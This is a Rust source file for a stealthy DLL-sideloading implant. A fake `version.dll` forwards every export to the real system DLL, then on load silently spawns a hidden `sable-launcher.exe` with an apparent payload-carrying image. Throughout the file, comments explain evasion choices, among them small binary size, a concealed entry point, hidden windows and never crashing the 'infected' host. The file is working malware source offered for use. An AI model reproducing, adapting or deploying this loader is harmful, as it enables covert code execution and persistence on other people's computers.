//! A `version.dll` that is a real proxy and also starts a launcher.
//!
//! Windows resolves a DLL import by searching the directory of the executable that imports it
//! before it looks in `System32`. Drop a `version.dll` beside a program that imports
//! `version.dll` and the program loads ours. That is the whole mechanism; everything else here
//! is about not being noticed.
//!
//! **Two jobs, and they are separate.**
//!
//! 1. **Answer every export.** A program that imports `version.dll` imports it by name. If a
//!    name is missing, `LoadLibrary` fails and the program does not start — loud, and the
//!    operator learns nothing. So all seventeen exports exist, and each one calls Microsoft's
//!    implementation out of `System32`. No stub returns success: a caller of `VerQueryValueW`
//!    gets a real answer from the real function.
//!
//!    **Why not true forwarders.** A forwarder is a string in the export table the loader
//!    resolves — no code at all, and the function a caller reaches *is* the system function at
//!    the system function's address. That needs an absolute target
//!    (`C:\Windows\System32\version.dll.Name`, because a bare `version.dll.Name` resolves back
//!    to this file and every call recurses until the stack runs out). GNU `ld` splits a `.def`
//!    line and a `.drectve` directive on `:`, so the absolute form does not link
//!    (`ld: cannot export C:: symbol not found`). `link.exe` accepts it. The `.def` in this
//!    crate is therefore true-forwarder-shaped for a toolchain that will take it, and the code
//!    below is the portable path this one can actually build.
//!
//!    **Why a generic thunk rather than seventeen prototypes.** On x64 there is one calling
//!    convention: four integer arguments in registers, the rest on the stack, integer return in
//!    `RAX`. Every one of these functions takes integers and pointers and returns an integer, so
//!    a target cast to `extern "system" fn(u64 x 8) -> u64` passes arguments through
//!    byte-exactly and reads the return from the right register. Seventeen prototypes would be
//!    seventeen chances to be wrong, and one wrong prototype is a host process crashing inside
//!    a function nobody calls. `GetFileVersionInfoByHandle` is not in the public SDK, so its
//!    prototype would have been a guess.
//!
//! 2. **Start the launcher.** `DllMain` at `DLL_PROCESS_ATTACH` finds the directory the DLL was
//!    loaded from, looks for the launcher beside it, and starts it. If a carrier image sits in
//!    the same directory the launcher is pointed at it with `--carrier`, so the picture is the
//!    only thing that has to be replaced between builds.
//!
//! **Why a thread.** `DllMain` runs under the loader lock: the process cannot load or unload
//! another module until it returns, and `CreateProcessW` maps a new image. Doing the work on a
//! thread costs one `CreateThread` and removes the deadlock the direct call can produce on a
//! loaded machine. `CreateThread` is one of the four calls Microsoft documents as safe from
//! `DllMain`.
//!
//! **Why `no_std`.** Size is the signature nobody looks for. Rust's `std` brings a formatter, a
//! path engine and a panic runtime into a file that sits next to a host and is compared against
//! a 30 KB system DLL; linking it produced 252 KB. `core` plus raw kernel32 calls produce a few
//! kilobytes, and the only thing lost is `format!` and `Path`, which this file never needed —
//! a command line is a concatenation of two literals and a string, and the last backslash is a
//! byte scan.
//!
//! **What it does when the launcher is missing.** Nothing at all. The exports still answer the
//! host, the host still runs, and there is nothing to find. A sideload that breaks the program
//! it infected is worse than no sideload: it is a crash report with a filename in it.

#![no_std]
#![allow(non_snake_case)]

use core::ffi::c_void;
use core::mem::size_of;
use core::panic::PanicInfo;
use core::ptr;
use core::sync::atomic::{AtomicUsize, Ordering};

// --- the contract with the rest of the build ---------------------------------
//
// Names that have to agree with the Python side. They live here rather than in a config because
// they are baked into a binary dropped next to a host: the launcher name is what the installer
// (2.1) writes, and the carrier flag is `agent.loader.CARRIER_FLAG`, duplicated for the same
// reason `loader.HELPER_FLAG` is — the DLL has no way to import it, and a string declared twice
// that disagrees reads as "there is no payload" rather than "the flag was dropped".

/// The launcher the installer puts down. Case-insensitive on Windows; written as shipped.
const LAUNCHER: &[u8] = b"sable-launcher.exe";

/// `agent.loader.CARRIER_FLAG`, and the two shapes `core.forge` can weld a tail onto. A
/// picture cannot be started, so the launcher has to be pointed at one. First match wins, so a
/// directory holding two does not produce two launches.
const CARRIER_FLAG: &[u8] = b"--carrier";
const CARRIERS: [&[u8]; 2] = [b"sable.png", b"sable.jpg"];

// --- kernel32 ----------------------------------------------------------------

type Handle = *mut c_void;
type Bool = i32;

const DLL_PROCESS_ATTACH: u32 = 1;
const TRUE: Bool = 1;
const FALSE: Bool = 0;

const CREATE_NO_WINDOW: u32 = 0x0800_0000;
const STARTF_USESHOWWINDOW: u32 = 0x0000_0001;
const SW_HIDE: u16 = 0;

const INVALID_FILE_ATTRIBUTES: u32 = 0xFFFF_FFFF;
const FILE_ATTRIBUTE_DIRECTORY: u32 = 0x0000_0010;

/// `LoadLibraryExW` flag: search `System32` and nothing else. Without it, the search order that
/// got this DLL loaded is the search order that would resolve `version.dll` again — this file.
const LOAD_LIBRARY_SEARCH_SYSTEM32: u32 = 0x0000_0800;

/// Enough for any real install path. A DLL beside a host lives in a directory, not in the
/// long-path tail, and 4 KiB of stack is cheaper than a second allocation.
const PATH_WIDE: usize = 2048;

#[repr(C)]
struct StartupInfoW {
    cb: u32,
    lpReserved: *mut u16,
    lpDesktop: *mut u16,
    lpTitle: *mut u16,
    dwX: u32,
    dwY: u32,
    dwXSize: u32,
    dwYSize: u32,
    dwXCountChars: u32,
    dwYCountChars: u32,
    dwFillAttribute: u32,
    dwFlags: u32,
    wShowWindow: u16,
    cbReserved2: u16,
    lpReserved2: *mut u8,
    hStdInput: Handle,
    hStdOutput: Handle,
    hStdError: Handle,
}

#[repr(C)]
struct ProcessInformation {
    hProcess: Handle,
    hThread: Handle,
    dwProcessId: u32,
    dwThreadId: u32,
}

extern "system" {
    fn GetModuleFileNameW(module: Handle, buffer: *mut u16, size: u32) -> u32;
    fn GetFileAttributesW(name: *const u16) -> u32;
    fn GetProcAddress(module: Handle, name: *const u8) -> *const ();
    fn LoadLibraryExW(name: *const u16, file: Handle, flags: u32) -> Handle;
    fn CreateThread(
        attributes: *const u8,
        stack_size: usize,
        start: extern "system" fn(*mut c_void) -> u32,
        parameter: *mut c_void,
        flags: u32,
        thread_id: *mut u32,
    ) -> Handle;
    fn CreateProcessW(
        application: *const u16,
        command_line: *mut u16,
        process_attributes: *const u8,
        thread_attributes: *const u8,
        inherit_handles: Bool,
        flags: u32,
        environment: *const u8,
        current_directory: *const u16,
        startup_info: *mut StartupInfoW,
        process_information: *mut ProcessInformation,
    ) -> Bool;
    fn CloseHandle(handle: Handle) -> Bool;
}

/// A panic in a DLL has nowhere to go: there is no `main` to return to and no console to print
/// to. `abort` terminates the whole host process, which is the loudest possible failure, so the
/// handler parks the thread instead. Nothing in this file can panic in practice — every slice
/// index is bounded by a length read from the same buffer — and parking is the option that
/// cannot turn a mistake here into somebody else's crash report.
#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    loop {
        core::hint::spin_loop();
    }
}

// --- the proxy half ----------------------------------------------------------


/// The real `version.dll`, out of `System32`, loaded once.
///
/// `0` is cached as well as a handle: a machine where this fails fails every time, and
/// seventeen exports each retrying a failed `LoadLibrary` is seventeen stalls in a host's
/// startup path.
fn system_version() -> Option<Handle> {
    static MODULE: AtomicUsize = AtomicUsize::new(0);
    static LOADED: AtomicUsize = AtomicUsize::new(0);

    let handle = MODULE.load(Ordering::Acquire);
    if handle != 0 {
        return Some(handle as Handle);
    }
    if LOADED.load(Ordering::Acquire) != 0 {
        return None;
    }

    const NAME: &[u8] = b"version.dll\0";
    let mut wide = [0u16; 12];
    let mut index = 0;
    while index < wide.len() && NAME[index] != 0 {
        wide[index] = NAME[index] as u16;
        index += 1;
    }

    // SAFETY: the name is a NUL-terminated UTF-16 literal in a stack array that outlives the
    // call, and a null file handle with a search flag is the documented "find by name" form.
    let loaded = unsafe { LoadLibraryExW(wide.as_ptr(), ptr::null_mut(), LOAD_LIBRARY_SEARCH_SYSTEM32) };
    LOADED.store(1, Ordering::Release);
    if loaded.is_null() {
        return None;
    }
    MODULE.store(loaded as usize, Ordering::Release);
    Some(loaded)
}


/// Address of one export in the real DLL, or null.
fn real(name: &[u8]) -> *const () {
    let Some(module) = system_version() else {
        return ptr::null();
    };
    // SAFETY: the handle came from `LoadLibraryExW` and is held for the process lifetime; every
    // caller passes a literal with a trailing NUL.
    unsafe { GetProcAddress(module, name.as_ptr()) }
}

/// The pass-through signature. See the module docs: x64 has one integer calling convention, so
/// eight integer slots carry every argument these APIs take and `RAX` carries every return.
type Thunk = extern "system" fn(u64, u64, u64, u64, u64, u64, u64, u64) -> u64;


/// Declare one export that hands the call straight to the real function.
///
/// `0` on a system DLL that cannot be reached is the failure value for every one of these:
/// `FALSE`, a zero size, or a zero length.
macro_rules! forwarded {
    ($( $name:ident ),+ $(,)?) => {
        $(
            #[no_mangle]
            pub extern "system" fn $name(
                a: u64, b: u64, c: u64, d: u64,
                e: u64, f: u64, g: u64, h: u64,
            ) -> u64 {
                let target = real(concat!(stringify!($name), "\0").as_bytes());
                if target.is_null() {
                    return 0;
                }
                // SAFETY: `target` is an exported function of the system `version.dll` and the
                // signature matches the x64 integer ABI. No argument or return is a float.
                let call: Thunk = unsafe { core::mem::transmute(target) };
                call(a, b, c, d, e, f, g, h)
            }
        )+
    };
}

forwarded!(
    GetFileVersionInfoA,
    GetFileVersionInfoW,
    GetFileVersionInfoByHandle,
    GetFileVersionInfoExA,
    GetFileVersionInfoExW,
    GetFileVersionInfoSizeA,
    GetFileVersionInfoSizeW,
    GetFileVersionInfoSizeExA,
    GetFileVersionInfoSizeExW,
    VerFindFileA,
    VerFindFileW,
    VerInstallFileA,
    VerInstallFileW,
    VerLanguageNameA,
    VerLanguageNameW,
    VerQueryValueA,
    VerQueryValueW,
);

// --- the launcher half -------------------------------------------------------


/// A UTF-16 buffer being built one piece at a time. No allocation, no `Path`.
struct WideBuffer {
    data: [u16; PATH_WIDE],
    length: usize,
}

impl WideBuffer {
    fn new() -> WideBuffer {
        WideBuffer { data: [0; PATH_WIDE], length: 0 }
    }

    /// Append a byte string that is known to be ASCII, refusing anything that would not fit.
    /// A truncated command line is a launcher started with a mangled path, which reads as "no
    /// payload" — refusing is the honest end.
    fn push(&mut self, text: &[u8]) -> bool {
        if self.length + text.len() + 1 > PATH_WIDE {
            return false;
        }
        for byte in text {
            self.data[self.length] = *byte as u16;
            self.length += 1;
        }
        true
    }

    fn push_byte(&mut self, byte: u8) -> bool {
        if self.length + 2 > PATH_WIDE {
            return false;
        }
        self.data[self.length] = byte as u16;
        self.length += 1;
        true
    }

    /// Append `source[start..end]` unchanged. Used to carry the directory (and the full path)
    /// from the buffer `GetModuleFileNameW` filled into a command line.
    fn copy_from(&mut self, source: &[u16], start: usize, end: usize) -> bool {
        if end < start || end > source.len() {
            return false;
        }
        if self.length + (end - start) + 1 > PATH_WIDE {
            return false;
        }
        for index in start..end {
            self.data[self.length] = source[index];
            self.length += 1;
        }
        true
    }

    /// NUL-terminate in place. Returns null when there is no room for the terminator, which is
    /// the only case where a caller must not use the buffer.
    fn terminate(&mut self) -> *const u16 {
        if self.length + 1 > PATH_WIDE {
            return ptr::null();
        }
        self.data[self.length] = 0;
        self.data.as_ptr()
    }
}


/// The index just past the last separator, so `0` means the path has no directory at all.
fn directory_length(path: &[u16], length: usize) -> usize {
    let mut index = length;
    while index > 0 {
        let value = path[index - 1];
        if value == b'\\' as u16 || value == b'/' as u16 {
            return index;
        }
        index -= 1;
    }
    0
}


/// True when `directory[..length]` + `name` is a file that exists.
fn file_beside(path: &WideBuffer, length: usize, name: &[u8]) -> bool {
    let mut probe = WideBuffer::new();
    if !probe.copy_from(&path.data, 0, length) || !probe.push(name) {
        return false;
    }
    let terminated = probe.terminate();
    if terminated.is_null() {
        return false;
    }
    // SAFETY: the pointer is a NUL-terminated UTF-16 string inside `probe`, which outlives the
    // call.
    let attributes = unsafe { GetFileAttributesW(terminated) };
    attributes != INVALID_FILE_ATTRIBUTES && attributes & FILE_ATTRIBUTE_DIRECTORY == 0
}


/// Start the command line already built in `line`, with `directory` as the working directory.
///
/// `lpCurrentDirectory` is passed rather than left null: a host started from `C:\Windows` or
/// from a shortcut with its own "start in" would otherwise hand the launcher a working
/// directory it does not own.
fn spawn(line: &mut WideBuffer, directory: *const u16) -> bool {
    let mut startup: StartupInfoW = unsafe { core::mem::zeroed() };
    startup.cb = size_of::<StartupInfoW>() as u32;
    startup.dwFlags = STARTF_USESHOWWINDOW;
    startup.wShowWindow = SW_HIDE;

    let mut process: ProcessInformation = unsafe { core::mem::zeroed() };
    let ok = unsafe {
        CreateProcessW(
            ptr::null(),
            line.data.as_mut_ptr(),
            ptr::null(),
            ptr::null(),
            0,
            CREATE_NO_WINDOW,
            ptr::null(),
            directory,
            &mut startup,
            &mut process,
        )
    };
    if ok == FALSE {
        return false;
    }

    // Neither handle is used again: the launcher is not waited on and its exit code is not
    // read. Closing both is the difference between a clean process object and a leak inside
    // somebody else's process, which is where this code runs.
    unsafe {
        CloseHandle(process.hThread);
        CloseHandle(process.hProcess);
    }
    true
}


/// The whole job, run on a thread rather than under the loader lock.
fn attach(module: Handle) {
    let mut path = WideBuffer::new();
    // SAFETY: `path.data` is a writable buffer of the size given.
    let written = unsafe { GetModuleFileNameW(module, path.data.as_mut_ptr(), PATH_WIDE as u32) };
    if written == 0 || written as usize >= PATH_WIDE {
        return;
    }
    path.length = written as usize;

    let directory = directory_length(&path.data, path.length);
    if directory == 0 {
        return;
    }

    if !file_beside(&path, directory, LAUNCHER) {
        // No launcher, no work. The host never learns this DLL was anything but a proxy.
        return;
    }

    // "<dir><launcher>"
    let mut line = WideBuffer::new();
    if !line.push_byte(b'"')
        || !line.copy_from(&path.data, 0, directory)
        || !line.push(LAUNCHER)
        || !line.push_byte(b'"')
    {
        return;
    }

    // " --carrier "<dir><picture>"", for the first carrier that exists.
    for carrier in CARRIERS {
        if !file_beside(&path, directory, carrier) {
            continue;
        }
        if !line.push(b" \"")
            || !line.push(CARRIER_FLAG)
            || !line.push(b"\" \"")
            || !line.copy_from(&path.data, 0, directory)
            || !line.push(carrier)
            || !line.push_byte(b'"')
        {
            return;
        }
        break;
    }
    line.terminate();

    let mut current = WideBuffer::new();
    if !current.copy_from(&path.data, 0, directory - 1) {
        return;
    }
    let working = current.terminate();
    if working.is_null() {
        return;
    }
    spawn(&mut line, working);
}


extern "system" fn thread_main(parameter: *mut c_void) -> u32 {
    attach(parameter as Handle);
    0
}

// --- the entry point ---------------------------------------------------------
//
// `DllMain`, as an assembly trampoline over a private Rust function.
//
// **Why it is not a `#[no_mangle] Rust fn`.** On `windows-gnu` Rust builds the export table from
// the crate's `#[no_mangle]` items, so the entry point becomes an eighteenth export — and the
// real `version.dll` has seventeen. `--exclude-symbols` does not help: it only suppresses
// symbols the linker *auto*-exports, and this one is listed explicitly. A `global_asm!` symbol
// is defined after that list is built, so the linker sees `DllMain`, `dllcrt2.o`'s
// `_DllMainCRTStartup` resolves it, and the export directory never learns it exists.
//
// The jump is one instruction and the trampoline has no frame of its own, so the register state
// the loader set up reaches `dll_attach` unchanged.

core::arch::global_asm!(
    ".text",
    ".globl DllMain",
    ".p2align 4, 0x90",
    "DllMain:",
    "jmp {attach}",
    attach = sym dll_attach,
);


/// One branch, one `CreateThread`, return.
///
/// Anything that fails here must still return `TRUE`: refusing the attach unloads the DLL and
/// takes the host's `version.dll` imports with it, which turns a silent sideload into a failed
/// start. The exports answer the host on their own, so there is nothing to refuse.
extern "system" fn dll_attach(module: Handle, reason: u32, _reserved: *mut c_void) -> Bool {
    if reason == DLL_PROCESS_ATTACH {
        // SAFETY: `CreateThread` is documented as safe from `DllMain`. The parameter is the
        // module handle, valid for the life of the process.
        unsafe {
            let thread = CreateThread(ptr::null(), 0, thread_main, module, 0, ptr::null_mut());
            if !thread.is_null() {
                CloseHandle(thread);
            }
        }
    }
    TRUE
}
